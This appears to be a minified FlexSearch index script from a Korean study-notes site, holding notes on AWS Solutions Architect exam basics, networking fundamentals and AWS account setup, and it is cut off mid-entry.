'use strict';(function(){const b={cache:!0};b.doc={id:'id',field:['title','content'],store:['title','href']};const a=FlexSearch.create('balance',b);window.bookSearchIndex=a,a.add({id:0,href:'/docs/docker/docker/dockertraining/infradocker-05/',title:"Infradocker 05",content:"****          ****            "}),a.add({id:1,href:'/docs/docker/docker/dockertraining/infradocker-06/',title:"Infradocker 06",content:"****          ****            "}),a.add({id:2,href:'/docs/docker/docker/dockertraining/infradocker-07/',title:"Infradocker 07",content:"****          ****            "}),a.add({id:3,href:'/docs/docker/docker/dockertraining/infradocker-08/',title:"Infradocker 08",content:"****          ****            "}),a.add({id:4,href:'/docs/aws/awssaa/saa-1/',title:"1장 AWS의 핵심 서비스",content:"SAA 요약정리  정리를 들어가기 전 핵심요소  자격 시험의 합격과 실패는 현장에서의 실무 경험과 실습 중심의 학습, 시험에 필요한 세부적인 정보와 숫자를 얼마나 잘 기억하는지에 달려 있다. AWS SAA는 핵심 AWS 서비스 구성 요소와 운영은 물론 서비스 간의 상호작용 방식도 이해가 필요 기본적인 공부는 Amazon의 공식문서 및 여러 실습 경험을 필요로 한다.    AWS SAA 참고자료      시험영역 출제 비율     1. 복원력을 갖춘 아키텍처 설계 34%   1-1. 안정적이고, 복원력을 갖춘 스토리지를 선택한다.     1-2. 어떻게 AWS 서비스를 사용해 결합 해제 매커니즘을 설계할지 결정한다.     1-3. 어떻게 멀티 티어 아키텍처 솔루션을 설계할지 결정한다.     1-4. 어떻게 고가용성 및/ 또는 내결함성을 갖춘 아키텍처를 설계할지를 결정한다.           2. 성능이 뛰어난 아키텍처 정의 24%   2-1. 성능이 뛰어난 스토리지 및 데이터베이스르 선택한다.     2-2. 캐싱을 적용해 성능을 개선한다.     2-3. 탄력성과 확장성을 갖춘 솔루션을 설계한다.           3. 안전한 애플리케이션 및 아키텍처 설명 26%   3-1. 어떻게 애플리케이션 티어를 보호할지 결장한다.     3-2. 어떻게 데이터를 보호할지 결정한다.     3-3. 단일 VPC 애플리케이션을 위한 네트워킹 인프라를 정의한다.           4. 비용에 최적화된 아키텍처 설계 10%   4-1. 어떻게 비용에 최적화된 스토리지를 설계할지 결정한다.     4-2. 어떻게 비용에 최적화된 컴퓨팅을 설계할지 결정한다.           5. 운영 면에서 탁월한 아키텍처 정의 6%   5.1 솔루션에서 운영 우수성을 지원할 수 있는 기능을 선택한다.         1장 AWS의 핵심 서비스   1장의 핵심내용  AWS 플랫폼 아키텍처와 그 기반 기술을 이해한다. AWS 관리 도구의 종류화 사용법을 이해한다. 지원 플랜의 종류와, 선택하는 방법을 이해한다.       클라우드 컴퓨팅과 가상화   모든 클라우드 운영 기술의 토대는 가상화라고 할 수 있다. 가상화란 단일 물리 서버를 하드웨어 리소스를 더 작은 단위로 나눌 수 있고, 물리 서버는 가상 머신 여러 개를 호스트할 수 있개 해주는 기술이다. 이러한 가상화의 장점은 가상 서버를 짧은 시간만에 프로비저닝해서 프로젝트에 필요한 시간만 정확하게 실행하고, 언제든지 종료해서 사용하던 리소스를 다른 워크로드에 즉시 활용할 수 있다. 클라우드 환경의 키워드는 확장성과 탄력성     확장성과 탄력성     키워드 설명     확장성 예기치 않은 수요가 발생하더라도 자동적으로 리소스츨 추가해서 효과적으로 대응할 수 있음     AWS 에서는 수요에 능동적으로 대처할 수 있게 설게 된 Auto Scaling 서비스를 사용해서 머신 이미지를 신속히 복제 및사용   탄력성 수요를 관리한다는 목적에서는 학장성과 동일한 못적을 자기고 있지만, 탄력성은 수요가 떨어질 때 용량을 자동으로 줄이는 개념       AWS 서비스의 범주   AWS 서비스의 서비스는 매우 다향하며, 현재도 그 범위가 확장되어가고 있다.       범주 기능     컴퓨팅 데이터 센터에서 물리 서버가 하는 역할을 복제한 클라우드 서비스     Auto Scaling, 로드 밸런싱, 서버리스 아키텍처에 이르는 고급 기능을 제공   네트워크 애플케이션 연결, 엑세스 제어, 향상된 원격 연결   스토리지 빠른 액세스와 장기적인 백업 요구에 모두 적합하게 설계된 여러 종류의 스토리지 플랫폼   데이터 베이스 관계형, NoSQL, 캐싱 등 데이터 형식이 필요한 사용 사레에 사용할 수 있는 관리형 데이터 솔루션   애플리케이션관 관리 AWS 계정 서비스와 운영 리소스 모니터링, 감사, 구성   보안과 자격 증명 인증 및 권한 부여, 데이터 및 연결 암호화, 타사 인증 관리 시스템과 통합 등을 관리하는 서비스   애플리케이션 통합 결합 해제, API를 사용한 애플리케이션 개발 프로세스를 설계하기 위한 도구        AWS 핵심 서비스      범주 서비스 기능     Computing EC2 AWS 상의 가상화된 인스턴스     Lambda 서버리스 애플리케이션     Auto Scaling 자동으로 인스턴스를 확장, 축소시키는 서비스     Elastic Load Balancing 네트워크의 트래픽을 분산시켜주는 라우팅 서비스     Elastic Beanstalk 컴퓨팅과 네트워킹 인프라를 프로비저닝하는 작업을 추상화한 관리형 서비스           Networking VPC 사용자 개인의 프라이빗 네트워크를 생성하는 서비스     Direct Connect AWS 서비스의 전용선을 통해 직접 연결하는 서비스     Router 53 AWS의 DNS서비스로 도메인 등록, 레코드 관리, 라우팅 프로토콜, 상태검사 등의 서비스를 제공     CloudFront AWS에서 제공하는 분산 글로벌 콘텐츠 전송 네트워크 ( CDN )           Storage S3 저렴하고 안정적인 다목적 객체 스토리지 서비스     Glacier 저렴하고 장기 저장할 수 있는 대형 데이터 아카이브를 제공하는 서비스     EBS EC2와 OS의 작업 데이터를 호스팅하는 가상의 데이터 드라이브 서비스     Storage Gateway AWS 클라우드 스토리지를 로컬 온프레미스 어플라이언스처럼 사용하는 하이브리드 스토리지 시스템           Database RDS 관리형 데이터베이스 인스턴스로 Mysql, Oracle, Aurora 등의 다양한 엔진을 제공     DynamoDB 빠르고 유연하며, 확장성이 뛰어난 관리현 서비스로 비관계형 (NoSQL) 데이터 베이스 워크로드에 적합           Application management CloudWatch 이벤트를 통해 프로세스 성능 및 활용률을 모니터링 하는 서비스     CloudFormation 탬플릿을 사용하여 AWS 리소스에 대한 사용을 스크립트화 시켜 사용하는 서비스     CloudTrail 계정내 모든 API 이벤트 기록을 수집하는 서비스     Config AWS 계정에서 변경 관리와 규정 준수를 지원하도록 설계된 서비스           Security, identification IAM AWS 계정의 사용자를 역할을 통해 관리하는 서비스     KMS AWS 리소스의 데이터를 보호하는 암호화 키를 생성하고 키사용을 관리하는 관리형 서비스     Directory Service AWS에서 자격 증면이나 관계를 정리할 때, Cognito, Microsoft AD도메인과 같은 자격 증명 공급자와 통합시키는 역할을 수행           Application Intergrated SNS 자동으로 주제에 관한 알림을 다른 서비스로 보내는 알림 서비스     SWF 수행해야하는 일련의작업을 조정하는 서비스로, 윤활유나 접착제의 역할을 수행     SQS 분산 시스템 내에서 이벤트 중심 메시징으로 결합을 해제해서 대형 프로세스의 개별 단계를 조정하는 서비스     APT Gateway Application 구현에 필요한 API를 생성 및 관리하는 서비스       AWS 플랫폼 아키텍처   AWS는 짧은 지연 시간 엑세스를 보장하는 것이 매우 중요하기 때문에, 이와 관련해서 CloudFront, Route53, Firewall Manager 등의 여러 서비스가 사용된다. AWS 계정 내의물리적 AWS 데이터 센터는 AZ ( Available Zone ), 가용영역이라 하며 아래와 같이 Region code로 표시된다. 같은 Region 내의 가용 영역은 6개까지가능하며, 리전 내에는 일종의 네트워크 주소 공간인 VPC가 있는 데, 리소스는 이 VPC에 배포된다. VPC 내에 서브넷을 만들 어 특정 가용 영역과 연결시켜, 리소스를 효과적으로 격리하고 내구성을 높이기 위한 복제를 수행할 수 있다. AWS 리전의 종류      Region name Region code Endpoint     미국 동부(오하이오) us-east-2 us-east-2.amazonaws.com   미국 동부(버지니아 북부) us-east-1 us-east-1.amazonaws.com   미국 서부(캘리포니아 북부) us-west-1 us-west-1.amazonaws.com   미국 서부(오레곤) us-west-2 us-west-2.amazonaws.com   아프리카(케이프타운) af-south-1 af-south-1.amazonaws.com   아시아 태평양(홍콩) ap-east-1 ap-east-1.amazonaws.com   아시아 태평양(뭄바이) ap-south-1 ap-south-1.amazonaws.com   아시아 태평양(오사카-로컬) ap-northeast-3 ap-northeast-3.amazonaws.com   아시아 태평양(서울) ap-northeast-2 ap-northeast-2.amazonaws.com   아시아 태평양(싱가포르) ap-southeast-1 ap-southeast-1.amazonaws.com   아시아 태평양(시드니) ap-southeast-2 ap-southeast-2.amazonaws.com   아시아 태평양(도쿄) ap-northeast-1 ap-northeast-1.amazonaws.com   캐나다(중부) ca-central-1 ca-central-1 .amazonaws.com   중국(베이징) cn-north-1 cn-north-1.amazonaws.com   중국(닝샤) cn-northwest-1 cn-northwest-1.amazonaws.com   유럽(프랑크푸르트) eu-central-1 eu-central-1.amazonaws.com   유럽(아일랜드) eu-west-1 eu-west-1.amazonaws.com   유럽(런던) eu-west-2 eu-west-2.amazonaws.com   유럽(밀라노) eu-south-1 eu-south-1.amazonaws.com   유럽(파리) eu-west-3 eu-west-3.amazonaws.com   유럽(스톡홀름) eu-north-1 eu-north-1.amazonaws.com   중동(바레인) me-south-1 me-south-1.amazonaws.com   남아메리카(상파울루) sa-east-1 sa-east-1.amazonaws.com       AWS 안정성과 규정   AWS의 대부분의 서비스는 기본 규정, 법률, 보안의 대한 기초 사항이 존재한다. AWS 보안과 안정성을 위해 수 많은 노력과 시도들을 해왔으며, 이에 관련된 내용은 AWS 규정를 참조하길바란다.     AWS의 공동 책임 모델   AWS의 서비스는 기본적으로 보안에 대학 책임은 AWS와 사용자가 책임을 분담하는 구조를 이루고 있다. 클라우드 상의 인프라를 안정적으로 관리하는 일은 AWS의 책임이지만, AWS의 리소스를 사용하는 것은 사용자의 일이며, 그에 따른 책임도 사용자에게 있다.     AWS 책임의 따른 분류  사용자의 책임  클라우드 내부  사용자의 데이터 사용자 애플리케이션, 엑세스 관리 운영 체제, 네트워크, 엑세스 구성 데이터 암호화    \rAWS의 책임  클라우드 자체  하드웨어와 네트워크 유지보수 AWS 글로벌 인프라 관리형 서비스    \r\r   AWS 작업   AWS 서비스를 실행하려면 해당 서비스를 관리할 도구가 있어야 한다. AWS 서비스는 기본적으로 GUI 환경을 제공하지만, 보다 복잡한 환경을 구현할 경우에는 전문적인 관리 도구를 사용해야 할 수도 있다.    AWS CLI  AWS CLI를 사용하면 컴퓨터 명령줄에서 복잡한 AWS 작업을 실행할 수 있다. 작동방식에 익숙해지면 GUI에 비해 간단하고 효율적인 작업이 가능해진다.      AWS SDK  AWS 리소스에 엑세스하는 작업을 애플리케이션 코드에 통합하려면 쓰고 있는 언어에 맞는 SDk를 사용해야 한다.      기술지원 및 온라인 리소스  AWS에는 다양한 유형의 지원이 있으며, 지원마다 어떤 내용이 있는 지 이해할 필요가 있다.      지원플랜   기본 플랜은 모든 계정에 무료로 제공되며, 문서, 백서, 지원 포럼 등의 고객 서비스에 요구할 수 있고, 청구 및 계정 지원 문제가 포함된다.\n  개발자 플랜은 $29부터 시작하며, 계정 소유자 한 명만 일반적 지침과, 시스템 손상에 관해 문의할 수 있으며, 클라우드 지원 담당자가 응답한다.\n  비즈니스 플랜은 $100 이상이며 문의할 수 있는 사용자 수에 제한이 없고, 신속한 응답을 보장한다. 시스템 손상, 개별적 지침, 문제 해결, 지원 API 등의 서비스를 제공한다.\n  엔터프라이즈 지원 플랜은 다른 지원 모든 지원 플랜을 포함하며, 운영과 설계 검토를 위한 AWS 솔루션스 아키텍트 지원, 전담 기술 지원, 관리자 지원, 컨시어지 지원이 추가된다.\n  엔터프라이즈 지원은 복잡한 미션 크리티컬 배포에 큰 도움이 될 수 있지만, 매월 최소 $15.000을 지급해야 한다.\n  지원플랜 참고 사이트\n      기타 지원 리소스  AWS 커뮤니티 포럼 AWS 설명서 AWS Well-Architected       1장 요약    클라우드 컴퓨팅은 물리적 리소스를 작고 유연한 가상 단위로 나누는 기술에 기반을 둔다.\n  AWS는 거대한 물리적 리소스를 가상 단위로 나누어, 가장의 리소스를 종량제로 임대하여 저렴하게 제공해주는 서비스이다.\n  AWS 장점은 탄력성과 확장성으로, 이는 자원의 소모를 자동적으로 유동적으로 비용을 최소화시킬 수 있다.\n  많은 AWS의 서비스들이 있으며, 이를 통해 거의 모든 디지털 요구사항을 처리할 수 있다. 또한 이러한 서비스들은 지금도 확장되어가고 있다.\n  AWS 리소스는 Management Console과 AWS CLI로 관리할 수 있으며, AWS SDK로 생성한 코드로도 관리할 수 있다.\n  기술 및 계정 지원에는 지원 플랜, 설명서, 포럼, 백서 등이 있다.\n    "}),a.add({id:5,href:'/docs/project/study/day1/',title:"1주차",content:"Network    Network의 이해     Network ( 정보통신 )\n  Net(그물) + work(일하다)로 그물의 형태로 얽혀 임의의 일을 하는 행위를 의미\n  다수의 통신수단을 활용하여 정보의 송신자와 수신자가 통신 기술을 이용하여 서로 소통하는 그물망처럼 연결된 통신망으로, 근거리 혹은 원거리 통신을 제공하여 수신자와 송신자 사이에 데이터를 전송\n  네트워크과 인터넷의 차이는 인터넷은 네트워크의 망과 망 사이의 통신을 의미\n       정보통신의 주요 요소      주요요소 특징     송신자 ( Sender ) 정보를 생산하여 보내는 사람이나 장치, 컴퓨터, 노드   수신나 ( Receiver ) 정보를 받아서 처리하는 사람이나 장치, 컴퓨터, 노드   전송매체( Medium ) 송신자가 수신자에게 정보를 보낼 떄 사용하는 물리적 경로 및 수단   프로토콜( Protocol ) 다수의 송신자와 수신자 사이에서 정보통신을 원할하게 하기 위한 상호간의 규칙 혹은 약속       Network topology   네트워크는 그 목적과 형태에 따라 여러 가지 모양으로 설계 및 구축되는 데, 형태에 따른 다양한 설계 발법을 토폴로지 ( topology ) 라 칭함       분류 설명     Star 중앙에 있는 네트워크 장비를 통해 모두 연결된 형태, 중앙의 장비가 고장나면 모든 시스템들이 통신 불가 2계층, 스위치 장비를 통해 LAN 대역을 구성   Mash 모든 시스템들이 각각 개별적으로 연결됨, 비용이 많이 든다. 3계층, 라우터 장비를 통해 WAN 대역을 구성   Bus 하나의 선을 통해 여러 시스템을 연결   Tree 시스템을 여러 계층으로 나눠서 연결   Ring 인접 시스템을 1:1로 연결   Hybrid 여러 형태를 조합하여 구성한 형태       데이터의 전송방식   데이터는 전송 방식에 따라 회선 및 패킷 교환망으로 분류가 가능      종류 특징 예시     회선교환망 독립적인 회선을 사용 군부대 인트라넷   패킷교환망 데이터만은 이용하는 통신 형태 Switch 등의 네트워크 장비를 통해 연결          그림 옵션 설명      유니캐스트 1:1 통신을 할 때 사용하는 방식, 특정 대상과 통신을 할 때 사용하는 방식    멀티캐스트 1:n 특정 그룹과 통신하는 방식    브로드캐스트 1:n 네트워크 내의 모든 시스템과 통신하는 방식, 불특정 다수와 통신       규모의 따른 분류방식     종류 특징     LAN - 근거리 통신망 집, 학교, 사무실 등 10km 이내의 거리 안의 단말기들로 구성   MAN - 대도시 통신망 도시 규모의 있는 단말기들을 연결한 통신망   WAN - 원거리 통신망 국가나 대륙과 같은 매우 넓은 지역을 연결하는 통신망            유선 전송 매체   이중 나선 테이블     플라스틱 절연체로 감싼 동선 2개가 꼬여있는 형태로, 저렴하며 대중적이며, 고속전송에 부적합하고 외부 신호의 간섭에 상대적으로 민감      종류 특징     UTP 보호되지 않는 꼬임선으로, 가장 저렴한 케이블   FTP 외부 신호의 간섭을 막기 위해 전체 케이블에 피복을 씌운 후 플라스틱 절연체로 감싼 케이블   STP 강하기 피복 처리된 꼬임선으로 외부 신호의 간섭을 막기 위하여 각각의 꾐선도 피복을 씌운 후 절연체로 감싸진 케이블        Category UTP 케이블 카테고리     Category 1 전화용 회선, 데이터 전송에는 적합하지 않음   Category 2 데이터 전송 최대 4Mbps   Category 3 데이터 전송 최대 10Mbps, 10Base-T 네트워크 사용   Category 4 데이터 전송 최대 16Mps, 토큰링 네트워크에서 사용   Category 5 데이터 전송 최대 100Mbps       동축 케이블      중앙에 위치한 와이어와 와이어를 둘러싸는 차폐형 그물망, 총 두개의 전도체로 연결되어 있으며, 이는 DVI 방식과 유사\n  이중 나선형 케이블보다 값은 비싸지만, 보다 큰 대역폭및 더 많은 데이터를 보다 빠른 속도로 전송가능\n     광섬유 케이블\n    머리카락보다 가느다란 유리섬유의 한쪽 끝에서 주파수 신호를 빛의 펄스로 변환하여 수신 측에 전달하여 데이터를 전송하는 방식\n  단, 단 방향으로만 데이터를 보낼 수 있으며, 구축 비용이 비싸고 설치방법이 복잡\n          Protocol    다수의 송신자와 수신자 사이에서 정보통신을 하기 위한 상호간의 규칙 혹은 약속을 의미\n  프로토콜은 구문 ( Syntax ), 의미 ( Semantics ), 타이밍 ( Timing )으로 이루어져 있다.\n     프로토콜의 기능    주소 지정\n  네트워크의 노드마다 서로 식별할 수 있는 고유 번호를 부여\n  기본적으로 수신자, 송신자의 주소(IP), 이름(MAC)에 대한 정보가 있어야 통신이 가능\n       단편화(Fragmentaion)과 재조립(Reassembly)    대용량의 데이터를 교환하는 프로토콜의 경우, 같은 크기의 데이터 블록(패킷)으로 분할(단편화)하여 전송하고, 전송된 데이터를 원래의 모양대로 하나로 붙이는(재조립) 작업을 수행        순서 지정(Sequencing)\n 데이터가 단위(패킷)별로 분한하여 전송될 떄, 각 패킷에 시퀸스 번호를 부여하여 순서대로 접속하도록 제어        데이터 프흠 제어(Data Flow COntrol)\n 수신자 측에서 데이터 전송량이나 전소 속도 등을 조절 슬라이딩 윈도우 ( Slidong Windows )등이 대표적인 흐름제어 기법        연결제어(Connection Control)\n 연결 지향형 데이터 전송의 경우 연결 설정, 데이터 전송, 연결 해제의 3단계로 구성 3 Way Hand shake         캡슐화 (Encapsulation)\n  \rEncapsulation\r...\r\r   위에 언급한 듯이 송신자가 수신자에게 데이터를 볼 수 있도록 포장하는 것을 인캡슐레이션이라 하며 이는 OSI L7에서 L1 방향으로 진행 된다.\n  Payload를 4 계층 TCP 헤더로 캡슐화( 세그먼트 ) -\u0026gt; IPv4, TCP 헤더로 캡슐화 ( 패킷 ) -\u0026gt; IPv4, TCP, Ethernet( 프레임 )으로 캡슐화 하는 것을 인 캡슐레이션이라 한다.\n  \r\r\r    \rDecapsulation\r...\r\r  인캡슐레이션 되어진 ( 포장되어진 ) 페이로드를 읽기위해서 포장되어진 역 순서로 다시 헤더를 제거하는 것을 디 캡슐레이션이라 하며, OSI L1에서 L7 방향으로 진행 된다.\n  Payload를 IPv4, TCP, Ethernet ( 프레임 ) -\u0026gt; IPv4, TCP, ( 패킷 ) -\u0026gt; TCP ( 세그먼트 ) -\u0026gt; 데이터로 캡슐화를 해제하는 것을 디 캡슐레이션이라 한다.\n  \r\r\r      오류 제어(Error Control)\n 오류 발생을 검출하여 재전송을 요구하거나, 직접 오류를 복구 ( 패리티 비트, 순환증복검사 등을 통하여 복구 )        동기화(Synchroniztion)\n 송신자와 수신자 사이 데이터를 전송할 떄, 타이밍이나 윈도우 크기 등을 합의하는 것        멀티 플렉싱(Multiflexing)\n 한 번에 여러 정보를 통신할 수 있도록 가상이 회선을 설정        전송 서비스\n 우선순위를 부여하여 각 특징에 맞게(속도, 보안 등) 차이를 두는 것       프로토콜 전송방식     전송방식 특징 대표적 사용 프로토콜     Bit 특별한 의미를 갖는 플래그 비트(Flag bit)를 데이터 앞 혹은 뒤에 붙여서 전송 HDLC, SDLC, LAPB   Byte 데이터 헤더에 전송 데이터의 문자 개수, 메시지 수신 상태에 따라 각종 제어 정보를 덧붙여 전달 DDCM   문자방식 전송 제어 문자(SOH, ETX, ETB, STX 등)을 사용하여 데이터의 시작과 끝을 정의 BSC       프로토콜의 특성    직접적 프로토콜 : 두 개의 통신 시스템이 점 대 점 형태로 직접 연결되어 통신하는 형태\n  간접적 프로토콜 : 여러 개의 통신 시스템이 하나의 커다란 시스템을 통해 간접적으로 연결된 형태\n      단일체적 프로토콜 : 통신과 관련한 모든 기능을 하나의 프로토콜이 전부 수행하는 형태\n  구조적 프로토콜 : 여러 개의 계층으로 나누어진 프로토콜이 하위 계층에서 상위 계층방향으로 서비스를 제공하는 형태\n      대칭적 프로토콜 : 서로 통신을 주고받는 대등한 형태의 프로토콜\n  비대칭적 프로토콜 : 서버-클라이언트 등 비대칭적인 관계에서 이루어지는 프로토콜\n      표준 프로토콜 : 어느 시스템에서나 작동하는 일반적인 프로토콜\n  비표준 프로토콜 : 정해진 환경이나 시스템상에서만 사용되는 프로토콜\n    IEEE의 LAN 표준 IEEE 802.1: 상위 계층 인터페이스(HILI, Higher Layer Interface)및 MAC 브리지\rIEEE 802.2: 논리 링크 제어(LLC, Logical Link Control)\rIEEE 802.3: CSMA/CD(Carrier Sense Multiple Access/Collision Detect), Ethernet\rIEEE 802.4: Token Bus\rIEEE 802.5: Token Ring\rIEEE 802.6: MAN\rIEEE 802.7: 광대역(Broadband) LAN\rIEEE 802.8: 광섬유(Optical Fiber) LAN\rIEEE 802.9: 종합 음성 데잍 (IVD, Integrated Voice \u0026amp; Data)\rIEEE 802.10: 네트워크 보안 (Network Security)\rIEEE 802.11 a/b/g/n/ac: 무선 네트워크(Wireless LAN \u0026amp; Wi-Fi)\r        신호    신호에는 위와 같이 아날로그, 디지털 신호로 분류되며 아날로그 신호는 연속적으로 변하는 전자기적 신호 의미하는 반면 디지털신호는 0과 1로 이루어진 데이터 신호를 의미    데이터 전송방식     통신의 종류 특징     Simplex Communication 단 방향통신   Half-Duplex Communication 양방향 통신이지만, 서로 동싱에 데이터는 송신은 불가능   Full-Duplex Communication 양방향 통신이 가능한 이중통신         데이터의 전송 단위 특징     직렬전송 여러 개의 데이터들이 하나의 전송 회선을 통하여 차례대로 전송되는 형태   병렬전송 여러 개의 데이터들이 여러 개의 전송 회선을 통하여 동시에 전송되는 형태      데이터 동기화에 따른 분류   비동기식 전송 ( Asnchronous Transmission )     Start bit와 Stop bit를 사용해서 한 문자 단위로 데이터를 전송하는 방식으로 전송효율이 낮아 전송 속도가 느린 특징을 가진다.      동기식 전송 ( Synchronous Transmission )     한 문자를 일정한 크기의 데이터(블록) 프레임으로 나누어 빠르게 전송하는 방식으로, 전송 효율이 높음    BPS ( Bit Per Second ) : 1초당 전송할 수 있는 bit의 수 Baud : 1초당 발생할 수 있는 이벤트 수를 나타내는 신호속도의 단위  BPS와 Baud의 상관관계 : BPS=Baud X 단위 신호당 Bit의 수    \r        변조   아날로그, 디지털 신호의 변환    아날로그 신호와 디지털 신호의 차이     아날로그 신호\n 연속적인 값으로 이루어진 신호로, 시시각각 값이 변함        디지털 신호\n 읽을 수 있는 값의 신호        아날로그 -\u0026gt; 아날로그 : AM, FM, PM       종류 특징     AM : 신호의 높낮이로 정보의 차이를 표현    FM : 진폭의 밀도로 정보의 차이를 표현    PM : 신호의 모양으로 정보의 차이를 표현         아날로그 -\u0026gt; 디지털 : PCM, DPCM, CM, ADM, ADPCM     PCM ( Purse Code Modulation )\n  송신 측에서 보내는 아날로그 신호를 전송이 용이한 펄스로 변환하고, 이를 다시 수신측에서 디지털 신호로 변환하여 변조하는 방법\n  아날로그 신호 -\u0026gt; 표준화 -\u0026gt; 양자화 -\u0026gt; 부호화 -\u0026gt; 디지털 신호의 순서\n        순서 이미지 특징     표본화(Sampling)  해당 시간 폭 동안의 여러 값을 하나의 대표 값으로 바꿔주는 단계   양자화(Quantumization)  표본화된 값들을 계산하기 쉬운 일정한 값으로 균일하게 만드는 단계   부호화(Encoding)  양자화된 값을 2진수로 변환   복화화(Decoding)  디지털 값을 다시 펄스 신호로 변환   필터링(Filtering)  각 펄스 신호 값 사이를 다시 아날로그 파형으로 변화       디지털 정보를 아날로그로 변조 : ASK, FSK, PSK, APSK(QAM)     종류 이미지 특징     ASK(진폭 변이 변조, Amplitude Shift Keying)  위 아래의 진폭의 차이를 통해 0과 1을 구분   FSK(주파수 변이 변조, Frequency Shift Keying)  좌우 진폭의 밀도 차이를 통해 0과 1을 구분   PSK(위상변이변조, Phase Shift Keying)  360도를 한 주기로 하여 그래프를 쪼개어 내는 방법   QAM(직교 진폭 변조, Quadrature Amlitude Modulation)  구형을 기준으로 변조            흐름 제어 Flow Control   Stop-and-Wait 방법      패킷을 보낸 후에는 일단 전송을 멈추고, 상대방이 받았다고 확인 메시지(ACK : Acknowledgement / 반대 Nak )를 줄 떄 까지 잠시 기다리는 방식     Sliding Windows    수신 측에서 설정한 윈도우의 크기만큼만 ACK 없이 데이터를 전달하 수 있으며, 만약 수신 측에서 전송에 대한 문제가 발생할 경우 이에 따라 데이터 전송의 크기를 줄임       오류제어   전송 오류의 종류      종류 특징     감쇠(ttenuation) 데이터가 회선을 통하여 전송되는 도중에 신호가 약해져 신호를 판달할 수 없게 된 경우   지연 왜곡(Delay Distortion) 데이터의 전송이 늦어지는 경우   잡음(Noise) 모니터, 전자레인지 등에 영향으로 신호가 왜곡되는 경우   혼선(Crosstalk) 전기 신호적 결합에 의해 한 회선의 데이터가 다른 회선에 영향을 주는 경우        Parity Bit Check   전송 데이터마다 페리티 비트를 추가하여 홀/짝 여부로 오류를 확인하는 방법    총 8비트 중 뒤 7개자리를 보고 1의 개수에 따라 홀수를 만들기 위해 1, 혹은 0을 대입       Block Sum Check   패리티 비트 검사의 단점을 극복하기 위해 수평과 수직 2차원적으로 Block을 합쳐 검사하는 방법    수평 행 단위 패리티에 수직 열 단위로 오류를 검사할 수 있도록 추가하여 이중으로 오류를 검사       순환 중복 검사(CRC: Cyclic Redundancy Check    정확한 에러 검출을 위하여 다항식을 사용하는 방법\n  오류가 발생하면 오류가 발생한 주변을 포함하는 집단 오류를 검출\n        그 외 오류제어의 종류      형태 종류 특징     기본형 Stop-and-Wait ARQ 수신자가 신호를 보내올 때까지 대기   연속적 Go-Back-N ARQ 에러가 발생한 블록 이후의 모든 블록을 재전송   선택적 Selective ARQ 수신 측에 오류가 발견된 프레임에 대해서 재전송 요청이 있을 해당 재전송(에러) 프레임만 전송   적응적 Adaptive ARQ 에러가 발생하면 전송하는 프레임의 크기를 조정하여 송신           고속 인터넷    토큰 패싱\n  Token이라는 제어비트를 송신하고 해당 토큰을 사용하여 통신하는 방식\n  각 통신 회선에 대한 제어 신호가 논리적으로 형성된 링에서 각 노드 간으로 이동하며 데이터를 전송\n       토큰 링    토큰 패싱 접속법을 이용하여 토큰을 보유하고 있는 동안만 독점적으로 데이터를 전송할 수 있는 형태        FDDI (Fiber Distributed Data Interface)\n 토큰 패싱을 통하여 접속하는 방법으로 토큰 링 네트워크로 구성되어 있으며, 토큰 프레임이 각 station으로 넘겨지는 방식       "}),a.add({id:6,href:'/docs/aws/',title:"Amazon Web Services",content:"Amazon Web Service Aws와 CloudComputing  Amazon Web Services ( AWS )  AWS Cloud Computing 와 aws   Cloud Computing의 종류  IaaS PaaS SaaS   On Premise 서버와 Cloud 서버의 차이  소유자 ( Owner ) 용량 ( Capacity )   렌탈 서버 ( 공유 서버 )와 Public의 차이  렌탈 서버 전용 서버와 가상 전용 서버 렌탈 서버와 AWS ( Public )의 차이   Private Cloud와 Public Cloud  AWS에서의 Private Cloud의 정의 AWS 서비스의 구성    AWS Computing  EC2  EC2 상태의 종류 EC2 구매옵션   Lightsail  Lightsail의 유료 Plan Lightsail\u0026amp; EC2   ECS  Linux Container Kernel Docker   Lambda  Lambda EC2 vs Lambda   Batch  amazonwebservice Batch의 구성요소 Batch Group   Elastic Beanstalk  Elastic Beanstalk의 장점     AWS Database  Amazon RDS ( Relational Database Service )  DB Instance DB Instance Storage Multi-AZ Read Replica Automated Backup Enhanced Monitoring RDS vs DB in EC2   Amazon DynamoDB  DynamoDB의 특징   Amazon ElastiCache  Cache In Memory Cache ( In Memory DataBase ) Memcache ElastiCache   Amazon Redshift  Redshift Redshift의 구성 Data Warehouse(DW) ETL(Extract, Tranform, Load) BI(Business Intelligence) Redshift vs RDS   Amazon Aurora   AWS Storage         AWS Network AWS Migrate AWS Developer AWS Management AWS Security AWS Analysis "}),a.add({id:7,href:'/docs/aws/amazonwebservice/',title:"AWS docs",content:"Amazon Web Service Aws와 CloudComputing  Amazon Web Services ( AWS )  AWS Cloud Computing 와 aws   Cloud Computing의 종류  IaaS PaaS SaaS   On Premise 서버와 Cloud 서버의 차이  소유자 ( Owner ) 용량 ( Capacity )   렌탈 서버 ( 공유 서버 )와 Public의 차이  렌탈 서버 전용 서버와 가상 전용 서버 렌탈 서버와 AWS ( Public )의 차이   Private Cloud와 Public Cloud  AWS에서의 Private Cloud의 정의 AWS 서비스의 구성    AWS Computing  EC2  EC2 상태의 종류 EC2 구매옵션   Lightsail  Lightsail의 유료 Plan Lightsail\u0026amp; EC2   ECS  Linux Container Kernel Docker   Lambda  Lambda EC2 vs Lambda   Batch  amazonwebservice Batch의 구성요소 Batch Group   Elastic Beanstalk  Elastic Beanstalk의 장점     AWS Database  Amazon RDS ( Relational Database Service )  DB Instance DB Instance Storage Multi-AZ Read Replica Automated Backup Enhanced Monitoring RDS vs DB in EC2   Amazon DynamoDB  DynamoDB의 특징   Amazon ElastiCache  Cache In Memory Cache ( In Memory DataBase ) Memcache ElastiCache   Amazon Redshift  Redshift Redshift의 구성 Data Warehouse(DW) ETL(Extract, Tranform, Load) BI(Business Intelligence) Redshift vs RDS   Amazon Aurora   AWS Storage         AWS Network AWS Migrate AWS Developer AWS Management AWS Security AWS Analysis "}),a.add({id:8,href:'/docs/aws/awstraining/start/',title:"AWS 시작하기",content:"AWS 시작히기    AWS 계정 생성    AWS 서비스를 이용하기 위한 계정을 생성하고, MFA를 사용하여 보안을 강화하는 방법에 대해 알아보도록 하겠습니다.     -먼저 AWS을 통해 AWS에 접속합니다.\n    AWS 계정 새로 만들기를 선택합니다.      다음 항목들을 기입 후, 계정 만들기를 선택합니다.      프로페셔널과 개인 중 맞는 항목을 선택 후, 아래 항목들을 기입합니다. 영어 주소를 모를시 Link를 참조하세요.   프로페셔널 : 조직, 기업의 사용\n개인 : 개인적으로 사용\n     사용가능한 카드에 대한 정보를 